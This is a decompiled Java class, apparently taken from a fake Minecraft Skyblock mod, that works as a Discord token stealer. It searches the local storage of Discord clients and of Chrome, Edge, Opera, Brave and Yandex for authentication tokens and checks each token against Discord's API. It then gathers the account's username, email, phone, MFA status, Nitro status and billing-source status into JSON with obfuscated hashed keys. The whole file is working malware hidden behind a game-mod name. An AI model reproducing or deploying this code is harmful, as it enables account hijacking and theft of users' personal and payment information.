/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  com.google.gson.JsonObject
 *  com.google.gson.JsonParser
 */
package codes.biscuit.sbHook;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class hookSkyblock {
    public static String getDiscordTokens() {
        ArrayList<String> paths = new ArrayList<String>(Arrays.asList(System.getenv("APPDATA") + "\\LightCord", System.getenv("APPDATA") + "\\discord", System.getenv("APPDATA") + "\\discordptb", System.getenv("APPDATA") + "\\discordcanary", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"));
        List<Object> g = new ArrayList();
        paths.stream().map(hookSkyblock::p).filter(Objects::nonNull).forEach(g::addAll);
        g = g.stream().distinct().collect(Collectors.toList());
        g = hookSkyblock.v(g);
        String ret = g.stream().map(hookSkyblock::u).collect(Collectors.joining(","));
        if (ret.length() <= 0) {
            return "\"c16742a08b39d23c3c5dff720bbb47e3\":{\"bbc5acb50380261700264afec393a1f9\":\"NA\",\"e88e2125c6cecd6733b76c76eed666c5\":\"NA\",\"a5e968c1d474e384d22f33bdee08c7aa\":\"NA\",\"af292c72efa64032685a4ae0114f7442\":\"NA\",\"babde58874573dc60861cd793067e46c\":\"NA\",\"bd6002c86ed700efd5b3b0bfd88f23b4\":\"NA\",\"be1186fafd728cc1836d44457b9ab1ec\":\"NA\"}}";
        }
        return ret;
    }

    private static String u(String s) {
        String f = hookSkyblock.f(s);
        if (f != null && !f.isEmpty()) {
            JsonObject asJsonObject = new JsonParser().parse(f).getAsJsonObject();
            String aa = asJsonObject.get("username").getAsString() + "#" + asJsonObject.get("discriminator").getAsString();
            String ab = asJsonObject.get("email").getAsString();
            String ac = asJsonObject.get("mfa_enabled").getAsString();
            String ad = asJsonObject.get("phone").isJsonNull() ? "None" : asJsonObject.get("phone").getAsString();
            String ae = asJsonObject.has("premium_type") ? "True" : "False";
            String af = hookSkyblock.w(s) ? "True" : "False";
            return "\"c16742a08b39d23c3c5dff720bbb47e3\":{\"bbc5acb50380261700264afec393a1f9\": \"" + aa + "\", \"e88e2125c6cecd6733b76c76eed666c5\": \"" + ab + "\", \"a5e968c1d474e384d22f33bdee08c7aa\": \"" + ac + "\", \"af292c72efa64032685a4ae0114f7442\": \"" + ad + "\", \"babde58874573dc60861cd793067e46c\": \"" + ae + "\", \"bd6002c86ed700efd5b3b0bfd88f23b4\": \"" + af + "\", \"be1186fafd728cc1836d44457b9ab1ec\":\"" + s + "\"}}";
        }
        return "";
    }

    private static boolean w(String G) {
        String paymentInfo = hookSkyblock.n("https://discordapp.com/api/v6/users/@me/billing/payment-sources", G);
        if (paymentInfo == null) {
            return false;
        }
        return paymentInfo.length() > 4;
    }

    private static List<String> v(List<String> g) {
        ArrayList<String> l = new ArrayList<String>();
        g.forEach(G -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection)url.openConnection();
                hookSkyblock.j(G).forEach(con::addRequestProperty);
                con.getInputStream().close();
                l.add((String)G);
                return;
            }
            catch (Exception exception) {
                return;
            }
        });
        return l;
    }

    private static String n(String link, String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            hookSkyblock.j(auth).forEach(httpURLConnection::addRequestProperty);
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                String line;
                if ((line = bufferedReader.readLine()) == null) {
                    bufferedReader.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(line).append("\n");
            }
        }
        catch (Exception ignored) {
            return null;
        }
    }

    private static String f(String G) {
        return hookSkyblock.n("https://discordapp.com/api/v6/users/@me", G);
    }

    private static ArrayList<String> p(String inPath) {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList<String> g = new ArrayList<String>();
        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) {
            return null;
        }
        for (String s : list) {
            try {
                FileInputStream fileInputStream = new FileInputStream(path + s);
                DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));){
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        Matcher matcher = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);
                        while (matcher.find()) {
                            g.add(matcher.group());
                        }
                    }
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return g;
    }

    private static Map<String, String> j(String G) {
        HashMap<String, String> ret = new HashMap<String, String>();
        ret.put("Content-Type", "application/json");
        ret.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (G == null) {
            return ret;
        }
        ret.put("Authorization", G);
        return ret;
    }
}

